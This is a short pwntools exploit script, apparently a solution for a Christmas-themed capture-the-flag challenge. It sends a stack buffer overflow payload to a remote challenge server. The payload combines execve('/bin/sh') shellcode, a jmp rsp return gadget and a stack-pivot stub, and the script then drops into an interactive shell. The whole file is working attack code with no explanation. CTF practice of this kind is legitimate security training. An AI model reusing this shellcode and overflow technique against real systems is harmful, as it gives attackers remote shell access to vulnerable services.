from pwn import *

first_output = 'Tell Santa what you want for XMAS\n'

shellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

#p = gdb.debug('./chall','''
#    init-pwndbg
#    b *0x004006d5
#''')
# stack pivot???
p = remote('challs.xmas.htsp.ro',2000)
#p = process('./chall')
binary = ELF('./chall')
context.binary = binary
p.recvuntil(first_output)

sub_esp_jmp = asm('sub rsp, 0x40;jmp rsp')
jmp_rsp = 0x40067f

payload = shellcode +  b'A'*(0x2e-len(shellcode)) + b'\xff\xe4BBBBBBBB' + p64(jmp_rsp) + sub_esp_jmp

p.sendline(payload)
p.interactive()